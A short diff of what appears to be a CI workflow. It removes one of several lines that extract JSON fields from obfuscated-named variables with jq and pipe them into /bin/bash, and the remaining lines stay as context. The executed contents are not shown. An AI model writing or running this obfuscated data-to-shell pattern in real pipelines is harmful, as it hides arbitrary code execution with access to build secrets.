@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$mprf76304" | jq -r .zybfu2007 | /bin/bash
           echo $b00 | jq -r .inr70953 | /bin/bash
           printf '%s' "$or94241" | jq -r .udbn3 | /bin/bash
-          echo $eow19 | jq -r .k87 | /bin/bash
           echo $zjc9 | jq -r .ofzs54 | /bin/bash
 
       - name: Save data
